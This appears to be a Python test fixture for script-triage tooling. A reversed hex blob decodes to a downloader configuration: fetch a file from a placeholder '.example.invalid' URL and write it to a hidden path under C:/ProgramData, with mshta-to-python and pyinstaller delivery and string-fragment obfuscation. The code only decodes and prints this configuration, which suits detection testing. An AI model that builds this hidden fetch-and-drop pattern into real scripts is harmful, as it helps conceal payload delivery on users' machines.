#!/usr/bin/env python3

# Huntress Script Triage -- inert static-analysis fixture (cpython3)

import base64

import io

import os



MATERIAL_86d13698 = "79702e343237636332343832342d6574616470752e2f62614c73736572746e75482f617461446d6172676f72502f3a433d687461705f656c69667c343237636332343832342f6e6f6874795073736572746e75483d746e6567615f726573757c79702e61376335366266652f64696c61766e692e656c706d6178652e343237636332343832342f2f3a73707474683d6c72757c343237636332343832342d6e676961706d61633d64695f6e676961706d61637c6e6f687479705f6f745f617468736d3d6e696168635f73776f646e69777c656c6966656e6f5f72656c6c6174736e6979703d726569727261637c73746e656d676172665f676e69727473663d6e6f69746163737566626f7c656e696c657069705f726f746172656e65673d7861746e79737c313d746e756f635f65676174737c687461705f6f745f6d61657274735f747365757165723d726574706164617c656c69665f65746972772c65746f6d65725f657269757163613d73706574737c323d76"

CODEC_86d13698 = "hex_literal|reverse_bytes|"



def load_86d13698():

    return bytes.fromhex(MATERIAL_86d13698)



def decode_86d13698(stored_bytes):

    return bytes(reversed(stored_bytes))



def recover_86d13698():

    harmless_value = "left" if 2 > 1 else "right"

    decoder_function = decode_86d13698

    recovered_bytes = decoder_function(load_86d13698())

    configuration_text = recovered_bytes.decode("ascii", "strict")

    return configuration_text



def inspect_86d13698():

    return recover_86d13698()



def surface_86d13698():

    stream = (item for item in ("generator_pipeline", "fstring_fragments", "pyinstaller_onefile", "mshta_to_python"))

    return tuple(stream)



def obfuscation_86d13698():

    left, right = "fstrin", "g_fragments"

    return f"{left}{right}"



def plan_86d13698():

    fields = dict(item.split("=", 1) for item in inspect_86d13698().split("|"))

    analysis_surface = surface_86d13698()

    obfuscation_surface = obfuscation_86d13698()

    operation_plan = ("request_stream_to_path", fields["url"], fields["file_path"])

    return operation_plan + (analysis_surface, obfuscation_surface)



if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":

    print(inspect_86d13698())

